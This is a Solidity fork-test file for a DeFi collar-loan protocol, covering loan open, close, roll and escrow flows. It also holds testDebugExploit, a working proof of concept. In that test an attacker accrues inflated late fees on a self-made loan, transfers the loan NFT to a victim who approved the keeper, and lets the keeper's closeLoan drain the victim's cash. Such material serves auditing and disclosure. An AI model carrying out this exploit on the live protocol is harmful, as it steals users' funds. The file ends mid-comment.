// SPDX-License-Identifier: MIT
pragma solidity 0.8.22;

import "forge-std/Test.sol";
import "./DeploymentLoader.sol";
import { ILoansNFT } from "../../../src/interfaces/ILoansNFT.sol";
import { IRolls } from "../../../src/interfaces/IRolls.sol";
import { ICollarTakerNFT } from "../../../src/interfaces/ICollarTakerNFT.sol";
import { ITakerOracle } from "../../../src/interfaces/ITakerOracle.sol";
import { ICollarProviderNFT } from "../../../src/interfaces/ICollarProviderNFT.sol";
import { PriceMovementHelper, IERC20 } from "../utils/PriceMovement.sol";
import { ArbitrumMainnetDeployer, BaseDeployer } from "../../../script/ArbitrumMainnetDeployer.sol";
import { DeploymentUtils } from "../../../script/utils/deployment-exporter.s.sol";
import { OracleUniV3TWAP } from "../../utils/OracleUniV3TWAP.sol";

abstract contract LoansForkTestBase is Test, DeploymentLoader {
    function setUp() public virtual override {
        super.setUp();
    }

    function createProviderOffer(
        BaseDeployer.AssetPairContracts memory pair,
        uint callStrikePercent,
        uint amount,
        uint duration,
        uint ltv
    ) internal returns (uint offerId) {
        vm.startPrank(provider);
        console.log("-- New Provider Offer from:", provider);
        console.log("callStrikePercent:", callStrikePercent);
        console.log("Amount: %e", amount);
        console.log("Duration:", duration);
        console.log("putStrikePercent:", ltv);
        pair.cashAsset.approve(address(pair.providerNFT), amount);
        console.log("SENT CASH to CollarProvider contract: %e", amount);
        offerId = pair.providerNFT.createOffer(callStrikePercent, amount, ltv, duration, 0);
        console.log("new OfferId:", offerId);
        vm.stopPrank();
    }

    function openLoan(
        BaseDeployer.AssetPairContracts memory pair,
        address user,
        uint underlyingAmount,
        uint minLoanAmount,
        uint offerId
    ) internal returns (uint loanId, uint providerId, uint loanAmount) {
        vm.startPrank(user);
        console.log("-- Open New Loan from:", user);
        console.log("amount: %e", underlyingAmount);
        console.log("minLoanAmount: %e", minLoanAmount);
        console.log("offerId:", offerId);
        pair.underlying.approve(address(pair.loansContract), underlyingAmount);
        console.log("SENT Underlying to Loan: %e", underlyingAmount);
        (loanId, providerId, loanAmount) = pair.loansContract.openLoan(
            underlyingAmount,
            minLoanAmount,
            ILoansNFT.SwapParams(0, address(pair.loansContract.defaultSwapper()), ""),
            ILoansNFT.ProviderOffer(pair.providerNFT, offerId)
        );
        console.log("loanAmount Out: %e", loanAmount);
        console.log("new LoanId:", loanId);
        console.log("match providerId:", providerId);
        vm.stopPrank();
    }

    function closeLoan(
        BaseDeployer.AssetPairContracts memory pair,
        address user,
        uint loanId,
        uint minUnderlyingOut
    ) internal returns (uint underlyingOut) {
        vm.startPrank(user);
        console.log("-- Close Loan from:", user);
        ILoansNFT.Loan memory loan = pair.loansContract.getLoan(loanId);
        // approve repayment amount in cash asset to loans contract
        pair.cashAsset.approve(address(pair.loansContract), loan.loanAmount);
        console.log("SENT CASH to Loans: %e", loan.loanAmount);
        console.log("minimumOut: %e", minUnderlyingOut);
        underlyingOut = pair.loansContract.closeLoan(
            loanId, ILoansNFT.SwapParams(minUnderlyingOut, address(pair.loansContract.defaultSwapper()), "")
        );
        console.log("Underlying Out: %e", underlyingOut);
        vm.stopPrank();
    }

    function createRollOffer(
        BaseDeployer.AssetPairContracts memory pair,
        address provider,
        uint loanId,
        uint providerId,
        int rollFee,
        int rollDeltaFactor
    ) internal returns (uint rollOfferId) {
        vm.startPrank(provider);
        pair.cashAsset.approve(address(pair.rollsContract), type(uint).max);
        pair.providerNFT.approve(address(pair.rollsContract), providerId);
        uint currentPrice = pair.takerNFT.currentOraclePrice();
        uint takerId = loanId;
        rollOfferId = pair.rollsContract.createOffer(
            takerId,
            rollFee,
            rollDeltaFactor,
            currentPrice * 90 / 100, // minPrice 90% of current
            currentPrice * 110 / 100, // maxPrice 110% of current
            0,
            block.timestamp + 1 hours
        );
        vm.stopPrank();
    }

    function rollLoan(
        BaseDeployer.AssetPairContracts memory pair,
        address user,
        uint loanId,
        uint rollOfferId,
        int minToUser
    ) internal returns (uint newLoanId, uint newLoanAmount, int transferAmount) {
        vm.startPrank(user);
        pair.cashAsset.approve(address(pair.loansContract), type(uint).max);
        (newLoanId, newLoanAmount, transferAmount) = pair.loansContract.rollLoan(
            loanId, ILoansNFT.RollOffer(pair.rollsContract, rollOfferId), minToUser, 0, 0
        );
        vm.stopPrank();
    }
}

abstract contract BaseLoansForkTest is LoansForkTestBase {
    // constants for all pairs
    uint constant BIPS_BASE = 10_000;

    //escrow related constants
    uint constant interestAPR = 500; // 5% APR
    uint constant maxGracePeriod = 7 days;
    uint constant lateFeeAPR = 10_000; // 100% APR

    // Protocol fee params
    uint constant feeAPR = 100; // 1% APR

    uint expectedOraclePrice;

    // values to be set by pair
    address public cashAsset;
    address public underlying;
    uint offerAmount;
    uint underlyingAmount;
    uint minLoanAmount;
    int rollFee;
    int rollDeltaFactor;
    uint bigCashAmount;
    uint bigUnderlyingAmount;

    // Swap amounts
    uint swapStepCashAmount;

    // Pool fee tier
    uint24 swapPoolFeeTier;

    // Protocol fee values
    address feeRecipient;

    // escrow related values
    address escrowSupplier;

    // whale address
    address whale;

    uint slippage;
    uint callstrikeToUse;
    uint duration;
    uint durationPriceMovement;
    uint ltv;

    BaseDeployer.AssetPairContracts public pair;

    OracleUniV3TWAP oracleTWAP;

    function setUp() public virtual override {
        super.setUp();

        // create addresses
        whale = makeAddr("whale");
        feeRecipient = makeAddr("feeRecipient");
        escrowSupplier = makeAddr("escrowSupplier");
    }

    function setForkId(uint _forkId) public {
        forkId = _forkId;
        forkSet = true;
    }

    function createEscrowOffer(uint _duration) internal returns (uint offerId) {
        vm.startPrank(escrowSupplier);
        console.log("-- New Escrow Offer from:", escrowSupplier);
        pair.underlying.approve(address(pair.escrowNFT), underlyingAmount);
        console.log("SENT Underlying to Escrow: %e", underlyingAmount);
        console.log("duration:", _duration);
        console.log("APR:", interestAPR);
        console.log("maxGracePeriod:", maxGracePeriod);
        console.log("lateFeeAPR:", lateFeeAPR);
        offerId = pair.escrowNFT.createOffer(
            underlyingAmount,
            _duration,
            interestAPR,
            maxGracePeriod,
            lateFeeAPR,
            0 // minEscrow
        );
        console.log("Escrow OfferId:", offerId);
        vm.stopPrank();
    }

    function openEscrowLoan(uint _minLoanAmount, uint providerOfferId, uint escrowOfferId, uint escrowFee)
        internal
        returns (uint loanId, uint providerId, uint loanAmount)
    {
        vm.startPrank(user);
        // Approve underlying amount plus escrow fee
        pair.underlying.approve(address(pair.loansContract), underlyingAmount + escrowFee);

        (loanId, providerId, loanAmount) = pair.loansContract.openEscrowLoan(
            underlyingAmount,
            _minLoanAmount,
            ILoansNFT.SwapParams(0, address(pair.loansContract.defaultSwapper()), ""),
            ILoansNFT.ProviderOffer(pair.providerNFT, providerOfferId),
            ILoansNFT.EscrowOffer(pair.escrowNFT, escrowOfferId),
            escrowFee
        );
        vm.stopPrank();
    }

    function createEscrowOffers() internal returns (uint offerId, uint escrowOfferId) {
        uint providerBalanceBefore = pair.cashAsset.balanceOf(provider);
        offerId = createProviderOffer(pair, callstrikeToUse, offerAmount, duration, ltv);
        assertEq(pair.cashAsset.balanceOf(provider), providerBalanceBefore - offerAmount);

        // Create escrow offer
        escrowOfferId = createEscrowOffer(duration);
    }

    function executeEscrowLoan(uint offerId, uint escrowOfferId)
        internal
        returns (uint loanId, uint providerId, uint loanAmount)
    {
        uint expectedEscrowFee = pair.escrowNFT.interestFee(escrowOfferId, underlyingAmount);

        // Open escrow loan using base function
        (loanId, providerId, loanAmount) = openEscrowLoan(
            minLoanAmount, // minLoanAmount
            offerId,
            escrowOfferId,
            expectedEscrowFee
        );
    }

    function verifyEscrowLoan(
        uint loanId,
        uint loanAmount,
        uint escrowOfferId,
        uint feeRecipientBalanceBefore,
        uint escrowSupplierUnderlyingBefore,
        uint expectedProtocolFee
    ) internal view {
        uint expectedEscrowFee = pair.escrowNFT.interestFee(escrowOfferId, underlyingAmount);

        uint userUnderlyingBefore = pair.underlying.balanceOf(user) + underlyingAmount + expectedEscrowFee;

        checkLoanAmount(loanAmount);

        // Verify protocol fee
        assertEq(pair.cashAsset.balanceOf(feeRecipient) - feeRecipientBalanceBefore, expectedProtocolFee);

        // Verify loan state
        ILoansNFT.Loan memory loan = pair.loansContract.getLoan(loanId);
        assertTrue(loan.usesEscrow);
        assertEq(address(loan.escrowNFT), address(pair.escrowNFT));
        assertGt(loan.escrowId, 0);

        // Verify balances
        assertEq(pair.underlying.balanceOf(user), userUnderlyingBefore - underlyingAmount - expectedEscrowFee);
        assertEq(escrowSupplierUnderlyingBefore - pair.underlying.balanceOf(escrowSupplier), underlyingAmount);
    }

    function checkLoanAmount(uint actualLoanAmount) internal view {
        uint oraclePrice = pair.takerNFT.currentOraclePrice();
        uint expectedCashFromSwap = pair.oracle.convertToQuoteAmount(underlyingAmount, oraclePrice);
        // Calculate minimum expected loan amount (expectedCash * LTV)
        // Apply slippage tolerance for swaps and rounding
        uint minExpectedLoan = expectedCashFromSwap * ltv * (BIPS_BASE - slippage) / (BIPS_BASE * BIPS_BASE);

        // Check actual loan amount is at least the minimum expected
        assertGe(actualLoanAmount, minExpectedLoan);
    }

    function fundWallets() public {
        deal(address(cashAsset), user, bigCashAmount);
        deal(address(cashAsset), provider, bigCashAmount);
        deal(address(underlying), user, bigUnderlyingAmount);
        deal(address(underlying), provider, bigUnderlyingAmount);
        deal(address(underlying), escrowSupplier, bigUnderlyingAmount);
    }

    // tests

    function testOraclePrice() public view {
        uint oraclePrice = pair.oracle.currentPrice();
        (uint a, uint b) = (oraclePrice, expectedOraclePrice);
        uint absDiffRatio = a > b ? (a - b) * BIPS_BASE / b : (b - a) * BIPS_BASE / a;
        // if bigger price is less than 2x the smaller price, we're still in the same range
        // otherwise, either the expected price needs to be updated (hopefully up), or the
        // oracle is misconfigured
        assertLt(absDiffRatio, BIPS_BASE, "prices differ by more than 2x");

        assertEq(oraclePrice, pair.takerNFT.currentOraclePrice());
    }

    function testOpenAndCloseLoan() public {
        uint providerBalanceBefore = pair.cashAsset.balanceOf(provider);
        uint offerId = createProviderOffer(pair, callstrikeToUse, offerAmount, duration, ltv);

        assertEq(pair.cashAsset.balanceOf(provider), providerBalanceBefore - offerAmount);
        uint feeRecipientBalanceBefore = pair.cashAsset.balanceOf(feeRecipient);

        (uint loanId,, uint loanAmount) = openLoan(
            pair,
            user,
            underlyingAmount,
            minLoanAmount, // minLoanAmount
            offerId
        );
        // Verify fee taken and sent to recipient
        uint expectedFee = getProviderProtocolFeeByLoanAmount(loanAmount);
        assertEq(pair.cashAsset.balanceOf(feeRecipient) - feeRecipientBalanceBefore, expectedFee);
        checkLoanAmount(loanAmount);
        skip(duration);
        ICollarTakerNFT.TakerPosition memory position = pair.takerNFT.getPosition(loanId);
        (uint takerWithdrawal,) = pair.takerNFT.previewSettlement(position, pair.oracle.currentPrice());

        closeAndCheckLoan(loanId, loanAmount, loanAmount + takerWithdrawal, 0);
    }

    function testOpenEscrowLoan() public {
        uint escrowSupplierUnderlyingBefore = pair.underlying.balanceOf(escrowSupplier);
        (uint offerId, uint escrowOfferId) = createEscrowOffers();
        uint feeRecipientBalanceBefore = pair.cashAsset.balanceOf(feeRecipient);
        (uint loanId,, uint loanAmount) = executeEscrowLoan(offerId, escrowOfferId);
        uint expectedProtocolFee = getProviderProtocolFeeByLoanAmount(loanAmount);
        verifyEscrowLoan(
            loanId,
            loanAmount,
            escrowOfferId,
            feeRecipientBalanceBefore,
            escrowSupplierUnderlyingBefore,
            expectedProtocolFee
        );
    }

    function testOpenAndCloseEscrowLoan() public {
        //  create provider and escrow offers
        (uint offerId, uint escrowOfferId) = createEscrowOffers();
        (uint loanId,, uint loanAmount) = executeEscrowLoan(offerId, escrowOfferId);
        ILoansNFT.Loan memory loanBefore = pair.loansContract.getLoan(loanId);

        uint escrowSupplierBefore = pair.underlying.balanceOf(escrowSupplier);
        uint interestFee = pair.escrowNFT.interestFee(escrowOfferId, underlyingAmount);

        // Skip to expiry
        skip(duration);

        ICollarTakerNFT.TakerPosition memory position = pair.takerNFT.getPosition(loanId);
        (uint takerWithdrawal,) = pair.takerNFT.previewSettlement(position, pair.oracle.currentPrice());

        closeAndCheckLoan(loanId, loanAmount, loanAmount + takerWithdrawal, 0);

        // Check escrow position's withdrawable amount (underlying + interest)
        uint withdrawable = pair.escrowNFT.getEscrow(loanBefore.escrowId).withdrawable;
        assertEq(withdrawable, underlyingAmount + interestFee);

        // Execute withdrawal and verify balance change
        vm.startPrank(escrowSupplier);
        pair.escrowNFT.withdrawReleased(loanBefore.escrowId);
        vm.stopPrank();

        assertEq(
            pair.underlying.balanceOf(escrowSupplier) - escrowSupplierBefore, underlyingAmount + interestFee
        );
    }

    function testRollEscrowLoanBetweenSuppliers() public {
        // Create first provider and escrow offers
        (uint offerId1, uint escrowOfferId1) = createEscrowOffers();
        uint interestFee1 = pair.escrowNFT.interestFee(escrowOfferId1, underlyingAmount);

        uint userUnderlyingBefore = pair.underlying.balanceOf(user);
        (uint loanId, uint providerId,) = executeEscrowLoan(offerId1, escrowOfferId1);
        ILoansNFT.Loan memory loan = pair.loansContract.getLoan(loanId);
        // User has paid underlyingAmount + interestFee1 at this point
        assertEq(userUnderlyingBefore - pair.underlying.balanceOf(user), underlyingAmount + interestFee1);

        uint escrowSupplier1Before = pair.underlying.balanceOf(escrowSupplier);

        // Create second escrow supplier
        address escrowSupplier2 = makeAddr("escrowSupplier2");
        deal(address(underlying), escrowSupplier2, bigUnderlyingAmount);

        // Skip half the duration to test partial fees
        skip(duration / 2);

        // Get exact refund amount from contract
        (uint withdrawal, uint toLoans,) = pair.escrowNFT.previewRelease(loan.escrowId, 0);

        // Create second escrow supplier's offer
        vm.startPrank(escrowSupplier2);
        pair.underlying.approve(address(pair.escrowNFT), underlyingAmount);
        uint escrowOfferId2 = pair.escrowNFT.createOffer(
            underlyingAmount,
            duration,
            interestAPR,
            maxGracePeriod,
            lateFeeAPR,
            0 // minEscrow
        );
        vm.stopPrank();

        // Create roll offer using existing provider position
        uint rollOfferId = createRollOffer(pair, provider, loanId, providerId, rollFee, rollDeltaFactor);

        uint newEscrowFee = pair.escrowNFT.interestFee(escrowOfferId2, underlyingAmount);
        uint userUnderlyingBeforeRoll = pair.underlying.balanceOf(user);

        vm.startPrank(user);
        IRolls.PreviewResults memory results =
            pair.rollsContract.previewRoll(rollOfferId, pair.takerNFT.currentOraclePrice());
        // make sure preview roll fee is within 10% of actual roll fee
        assertApproxEqAbs(-results.toTaker, rollFee, uint(rollFee) * 1000 / 10_000);
        if (results.toTaker < 0) {
            pair.cashAsset.approve(address(pair.loansContract), uint(-results.toTaker));
        }
        pair.underlying.approve(address(pair.loansContract), newEscrowFee);
        (uint newLoanId, uint newLoanAmount,) = pair.loansContract.rollLoan(
            loanId,
            ILoansNFT.RollOffer(pair.rollsContract, rollOfferId),
            -1000e6,
            escrowOfferId2,
            newEscrowFee
        );
        vm.stopPrank();

        // Execute withdrawal for first supplier
        vm.startPrank(escrowSupplier);
        pair.escrowNFT.withdrawReleased(loanId);
        vm.stopPrank();

        // Verify first supplier got partial fees using exact toLoans amount
        // we use Ge because of rounding (seeing 1 wei difference 237823439879 != 237823439878)
        assertGe(pair.underlying.balanceOf(escrowSupplier) - escrowSupplier1Before, withdrawal);

        // Verify user paid new escrow fee and got refund from old escrow
        assertEq(userUnderlyingBeforeRoll - pair.underlying.balanceOf(user) + toLoans, newEscrowFee);

        // Skip to end of new loan term
        skip(duration);

        // Track second supplier balance before closing
        uint escrowSupplier2Before = pair.underlying.balanceOf(escrowSupplier2);

        (uint takerWithdrawal,) =
            pair.takerNFT.previewSettlement(pair.takerNFT.getPosition(newLoanId), pair.oracle.currentPrice());

        closeAndCheckLoan(newLoanId, newLoanAmount, newLoanAmount + takerWithdrawal, 0);

        // Execute withdrawal for second supplier
        vm.startPrank(escrowSupplier2);
        pair.escrowNFT.withdrawReleased(newLoanId);
        vm.stopPrank();

        // Verify second supplier got full amount + full fees
        assertEq(
            pair.underlying.balanceOf(escrowSupplier2) - escrowSupplier2Before,
            underlyingAmount + newEscrowFee
        );
    }

    function testRollLoan() public {
        uint offerId = createProviderOffer(pair, callstrikeToUse, offerAmount, duration, ltv);
        (uint loanId, uint providerId, uint initialLoanAmount) = openLoan(
            pair,
            user,
            underlyingAmount,
            minLoanAmount, // minLoanAmount
            offerId
        );

        uint rollOfferId = createRollOffer(pair, provider, loanId, providerId, rollFee, rollDeltaFactor);

        // Calculate and verify protocol fee based on new position's provider locked amount
        uint newPositionPrice = pair.takerNFT.currentOraclePrice();
        IRolls.PreviewResults memory expectedResults =
            pair.rollsContract.previewRoll(rollOfferId, newPositionPrice);
        assertGt(expectedResults.protocolFee, 0);
        assertGt(expectedResults.toProvider, 0);

        uint providerBalanceBefore = pair.cashAsset.balanceOf(provider);
        uint feeRecipientBalanceBefore = pair.cashAsset.balanceOf(feeRecipient);
        (uint newLoanId, uint newLoanAmount, int transferAmount) = rollLoan(
            pair,
            user,
            loanId,
            rollOfferId,
            -1000e6 // Allow up to 1000 tokens to be paid by the user
        );

        // Verify fee taken and sent to recipient
        assertEq(
            pair.cashAsset.balanceOf(feeRecipient) - feeRecipientBalanceBefore, expectedResults.protocolFee
        );
        assertEq(int(pair.cashAsset.balanceOf(provider) - providerBalanceBefore), expectedResults.toProvider);
        assertGt(newLoanId, loanId);
        assertGe(int(newLoanAmount), int(initialLoanAmount) + transferAmount);
    }

    function testFullLoanLifecycle() public {
        uint feeRecipientBalanceBefore = pair.cashAsset.balanceOf(feeRecipient);

        uint offerId = createProviderOffer(pair, callstrikeToUse, offerAmount, duration, ltv);

        (uint loanId, uint providerId, uint initialLoanAmount) =
            openLoan(pair, user, underlyingAmount, minLoanAmount, offerId);
        uint initialFee = getProviderProtocolFeeByLoanAmount(initialLoanAmount);
        // Verify fee taken and sent to recipient
        assertEq(pair.cashAsset.balanceOf(feeRecipient) - feeRecipientBalanceBefore, initialFee);

        // Advance time
        skip(duration - 20);

        uint recipientBalanceAfterOpenLoan = pair.cashAsset.balanceOf(feeRecipient);
        uint rollOfferId = createRollOffer(pair, provider, loanId, providerId, rollFee, rollDeltaFactor);

        // Calculate roll protocol fee
        IRolls.PreviewResults memory expectedResults =
            pair.rollsContract.previewRoll(rollOfferId, pair.takerNFT.currentOraclePrice());
        assertGt(expectedResults.protocolFee, 0);
        (uint newLoanId, uint newLoanAmount, int transferAmount) =
            rollLoan(pair, user, loanId, rollOfferId, -1000e6);

        assertEq(
            pair.cashAsset.balanceOf(feeRecipient) - recipientBalanceAfterOpenLoan,
            expectedResults.protocolFee
        );

        // Advance time again
        skip(duration);

        ICollarTakerNFT.TakerPosition memory position = pair.takerNFT.getPosition(newLoanId);
        (uint takerWithdrawal,) = pair.takerNFT.previewSettlement(position, pair.oracle.currentPrice());

        closeAndCheckLoan(newLoanId, newLoanAmount, newLoanAmount + takerWithdrawal, 0);
        assertGt(initialLoanAmount, 0);
        assertGe(int(newLoanAmount), int(initialLoanAmount) + transferAmount);

        // Verify total protocol fees collected
        assertEq(
            pair.cashAsset.balanceOf(feeRecipient) - feeRecipientBalanceBefore,
            initialFee + expectedResults.protocolFee
        );
    }

    function getProviderProtocolFeeByLoanAmount(uint loanAmount) internal view returns (uint protocolFee) {
        // Calculate protocol fee based on post-swap provider locked amount
        uint swapOut = loanAmount * BIPS_BASE / ltv;
        uint initProviderLocked = swapOut * (callstrikeToUse - BIPS_BASE) / BIPS_BASE;
        (protocolFee,) = pair.providerNFT.protocolFee(initProviderLocked, duration);
        assertGt(protocolFee, 0);
    }

    function closeAndCheckLoan(uint loanId, uint loanAmount, uint totalAmountToSwap, uint lateFee) internal {
        // Track balances before closing
        uint userCashBefore = pair.cashAsset.balanceOf(user);
        uint userUnderlyingBefore = pair.underlying.balanceOf(user);
        // Get current price from oracle
        uint currentPrice = pair.oracle.currentPrice();
        // Convert cash amount to expected underlying amount using oracle's conversion
        uint expectedUnderlying = pair.oracle.convertToBaseAmount(totalAmountToSwap, currentPrice) - lateFee;
        console.log("expectedUnderlying: %e", expectedUnderlying);
        console.log("currentPrice: %e", currentPrice);
        uint minUnderlyingOutWithSlippage = (expectedUnderlying * (BIPS_BASE - slippage) / BIPS_BASE);
        console.log("minUnderlyingOutWithSlippage: %e", minUnderlyingOutWithSlippage);

        uint underlyingOut = closeLoan(pair, user, loanId, minUnderlyingOutWithSlippage);

        assertApproxEqAbs(underlyingOut, expectedUnderlying, expectedUnderlying * slippage / BIPS_BASE);
        // Verify balance changes
        assertEq(userCashBefore - pair.cashAsset.balanceOf(user), loanAmount);
        assertEq(pair.underlying.balanceOf(user) - userUnderlyingBefore, underlyingOut);
    }

    function testOpenAndCloseLoanWithOraclePrice(uint newPrice) public {
        uint providerBalanceBefore = pair.cashAsset.balanceOf(provider);
        uint offerId = createProviderOffer(pair, callstrikeToUse, offerAmount, duration, ltv);

        assertEq(pair.cashAsset.balanceOf(provider), providerBalanceBefore - offerAmount);
        uint feeRecipientBalanceBefore = pair.cashAsset.balanceOf(feeRecipient);

        (uint loanId,, uint loanAmount) = openLoan(
            pair,
            user,
            underlyingAmount,
            minLoanAmount, // minLoanAmount
            offerId
        );
        // Verify fee taken and sent to recipient
        uint expectedFee = getProviderProtocolFeeByLoanAmount(loanAmount);
        assertEq(pair.cashAsset.balanceOf(feeRecipient) - feeRecipientBalanceBefore, expectedFee);
        checkLoanAmount(loanAmount);
        skip(duration);

        //mock oracle price to oracle contract
        vm.mockCall(
            address(pair.oracle),
            abi.encodeWithSelector(ITakerOracle.currentPrice.selector),
            abi.encode(newPrice)
        );
        console.log("--- MOCK ORACLE: %e ", pair.oracle.currentPrice());
        // then try move uniswap price to new price
        PriceMovementHelper.moveToTargetPrice(
            vm,
            router,
            whale,
            IERC20(cashAsset),
            IERC20(underlying),
            ITakerOracle(oracleTWAP),
            newPrice,
            500 * pair.oracle.currentPrice(),
            swapPoolFeeTier
        );

        ICollarTakerNFT.TakerPosition memory position = pair.takerNFT.getPosition(loanId);
        (uint takerWithdrawal,) = pair.takerNFT.previewSettlement(position, pair.oracle.currentPrice());

        closeAndCheckLoan(loanId, loanAmount, loanAmount + takerWithdrawal, 0);
    }

    function testDebugExploit() public {
        // 0. Setup

        console.log("--SETUP--");
        address keeper = makeAddr("keeper");
        address target = user2;
        address exploiter = user;
        {
            vm.prank(owner);
            pair.loansContract.setKeeper(keeper);
            // We give some cash to target user and exploited user
            deal(address(cashAsset), user2, bigCashAmount);
            deal(address(underlying), user2, bigUnderlyingAmount);
            // target user will approve to Keeper Bot address

            vm.startPrank(target);

            console.log("target cash balance: %e", pair.cashAsset.balanceOf(target));
            console.log("target underlying balance: %e", pair.underlying.balanceOf(target));
            // user1 will be exploiter

            vm.startPrank(exploiter);
            pair.cashAsset.approve(address(pair.providerNFT), type(uint).max);
            pair.underlying.approve(address(pair.loansContract), type(uint).max);
            pair.underlying.approve(address(pair.escrowNFT), type(uint).max);
        }
        //debug stuff
        uint currentPrice = pair.oracle.currentPrice();
        console.log("-ORACLE Price: %e ", currentPrice);

        //1. Attacker Setup
        uint callStrikePercent = 10_001;
        uint putStrikePercentage = 9900; // 99%
        uint _duration = 5 minutes;
        uint cashAmount = 100_000e6;
        uint maxAPR = 10_000 * 12; // 1200% APR
        uint _maxGracePeriod = 30 days;
        uint _underlyingAmount = underlyingAmount; // 1 WETH to NFT. after 29 days. late fee become 0.9 WETH
        uint minUnderlyingOut = 0;
        uint loanId = 0;
        uint escrowId = 0;
        address defaultSwapper = address(pair.loansContract.defaultSwapper());
        ILoansNFT.SwapParams memory swapParams = ILoansNFT.SwapParams(minUnderlyingOut, defaultSwapper, "");

        //. Attacker create self LoanNFT that is recoverable most of the fund.
        {
            console.log("--STEP 1--");
            vm.startPrank(exploiter);
            //attacker disable Keeper bot
            pair.loansContract.setKeeperApproved(false);

            uint providerOfferId =
                pair.providerNFT.createOffer(callStrikePercent, cashAmount, putStrikePercentage, _duration, 0);
            uint escrowOfferId = pair.escrowNFT.createOffer(
                _underlyingAmount,
                _duration,
                0, // no early fee
                _maxGracePeriod,
                maxAPR,
                0 // minEscrow
            );
            // lock in 1 WETH
            (loanId,,) = pair.loansContract.openEscrowLoan(
                _underlyingAmount,
                0,
                ILoansNFT.SwapParams(0, defaultSwapper, ""),
                ILoansNFT.ProviderOffer(pair.providerNFT, providerOfferId),
                ILoansNFT.EscrowOffer(pair.escrowNFT, escrowOfferId),
                0 //no fee for escrow
            );
            ILoansNFT.Loan memory loanInfo = pair.loansContract.getLoan(loanId);
            escrowId = loanInfo.escrowId;
        }
        //2. Attacker close loan and recover starting funds. Then start accrue late fee
        {
            console.log("--STEP 2--");
            skip(_duration + 1);
            //move ETH price down. This meant Provider gain Short Position
            uint newPrice = currentPrice * putStrikePercentage / 10_000;
            vm.mockCall(
                address(pair.oracle),
                abi.encodeWithSelector(ITakerOracle.currentPrice.selector),
                abi.encode(newPrice)
            );
            console.log("- MOCK ORACLE: %e ", pair.oracle.currentPrice());
            //close loan and Attacker regain all of their funds except Escrow still locked inside Taker NFT position.

            pair.takerNFT.settlePairedPosition(loanId);
            //. now Keeper can try close failed loan. But it will fail

            vm.startPrank(keeper);
            console.log("-KEEPER try closeLoan but revert");
            vm.expectRevert();
            pair.loansContract.closeLoan(loanId, swapParams);

            // skip 29 days. acrrue lots of late fee
            skip(_maxGracePeriod - _duration - 1);
            // print owed fee on this LoanId
            (uint totalOwed, uint lateFee) = pair.escrowNFT.currentOwed(escrowId);
            console.log("NFT totalOwed: %e", totalOwed);
            console.log("NFT lateFee: %e", lateFee);

            
            console.log("-KEEPER try forecloseLoan but revert");
            vm.expectRevert();
            pair.loansContract.forecloseLoan(loanId, swapParams);
        }
        {
            console.log("--STEP 3--");
            //3. Attacker transfer LoanNFT to another user that give approval to LoansNFT
            vm.startPrank(target);
            //target give token approval to LoansNFT so they can create loan
            pair.cashAsset.approve(address(pair.loansContract), type(uint).max);
            //give approval to Keeper
            pair.loansContract.setKeeperApproved(true);

            //. Now attacker can transfer NFT to target 
            vm.startPrank(exploiter);
            pair.loansContract.transferFrom(exploiter, target, loanId);


            //. Keeper now can call closeLoan before Grace Period end and take token from target to repay to escrower
            vm.startPrank(keeper);
            uint cacheBalanceBefore = pair.cashAsset.balanceOf(target);
            console.log("Before Exploit. Target cash balance: %e", pair.cashAsset.balanceOf(target));
            console.log("Before Exploit. Exploiter underlying balance: %e", pair.underlying.balanceOf(exploiter));
            pair.loansContract.closeLoan(loanId, swapParams);
            console.log("After Exploit . Target cash balance: %e", pair.cashAsset.balanceOf(target));
            console.log("After Exploit . Exploiter underlying balance: %e", pair.underlying.balanceOf(exploiter));
            uint exploitGain = cacheBalanceBefore - pair.cashAsset.balanceOf(target);
            console.log("ExploiterGain: %e", exploitGain);//3334e6 USDC
            
        }
        {
            //4. Attacker collect fee stolen from other user

        }
        // 1. Attacker creates a Provider offer with:
        //    - 99.99% put strike percentage
        //    - 100.01% call strike percentage
        //    - Minimum duration of 5 minutes.
        // 2. Attacker creates an Escrow offer with:
        //    - 1,200% late fee penalty
        //    - Maximum 30-day grace period
        //    - Minimum duration of 5 minutes.
        // 3. Attacker creates a LoansNFT with the above Provider and Escrow offers.
        // 4. Attacker creates a loan of 10,000 USDC, with 10 WETH as escrow.
        // 5. After 5 minutes, the price drops 0.1%, causing the Provider to gain 100% of the locked value in the Taker position.
        // 6. The Taker/Provider positions are settled, but the loan remains open.
        // 7. The attacker recovers most of the 10,000 USDC locked in the Provider position and retains 10 WETH held in the Escrow contract.
        // 8. The attacker waits a few days for late fees to accumulate, up to the maximum of 30 days, resulting in a ~9.8 WETH late fee (98% of 10 WETH).
        // 9. The attacker transfers the LoansNFT to another user who meets the exploit conditions outlined above.
        // 10. The KeeperBot calls `LoansNFT.closeLoan()` to close the loan:
        //     - 10,000 USDC is deducted from the user’s account.
        //     - The user gains the Taker position, but it has no value.
        //     - 10,000 USDC is swapped for 10 WETH.
        //     - 9.8 WETH is transferred as late fees to the Escrow contract (benefiting the attacker).
        //     - 0.2 WETH is transferred to the user’s account.
    }

    // commented out because skipping to after grace period makes price go stale
    //
    //    function testCloseEscrowLoanAfterGracePeriod() public {
    //        //  create provider and escrow offers
    //        (uint offerId, uint escrowOfferId) = createEscrowOffers();
    //        (uint loanId,, uint loanAmount) = executeEscrowLoan(offerId, escrowOfferId);
    //
    //        ILoansNFT.Loan memory loanBefore = pair.loansContract.getLoan(loanId);
    //        uint escrowSupplierBefore = pair.underlying.balanceOf(escrowSupplier);
    //        uint interestFee = pair.escrowNFT.interestFee(escrowOfferId, underlyingAmount);
    //
    //        // Skip past expiry
    //        skip(duration);
    //        uint expiryPrice = pair.oracle.currentPrice();
    //        // Get expiry price from oracle
    //        ICollarTakerNFT.TakerPosition memory position = pair.takerNFT.getPosition(loanId);
    //        (uint takerWithdrawal,) = pair.takerNFT.previewSettlement(position, expiryPrice);
    //        // bot settles the position
    //        pair.takerNFT.settlePairedPosition(loanId);
    //
    //        // skip past grace period
    //        skip(maxGracePeriod + 1);
    //
    //        // Calculate expected late fee
    //        (, uint lateFee) = pair.escrowNFT.currentOwed(loanBefore.escrowId);
    //        assertGt(lateFee, 0);
    //
    //        uint totalAmountToSwap = loanAmount + takerWithdrawal;
    //        closeAndCheckLoan(loanId, loanAmount, totalAmountToSwap, lateFee);
    //
    //        // Check escrow position's withdrawable (underlying + interest + late fee)
    //        uint withdrawable = pair.escrowNFT.getEscrow(loanBefore.escrowId).withdrawable;
    //        assertEq(withdrawable, underlyingAmount + interestFee + lateFee);
    //
    //        // Execute withdrawal and verify balance
    //        vm.startPrank(escrowSupplier);
    //        pair.escrowNFT.withdrawReleased(loanBefore.escrowId);
    //        vm.stopPrank();
    //
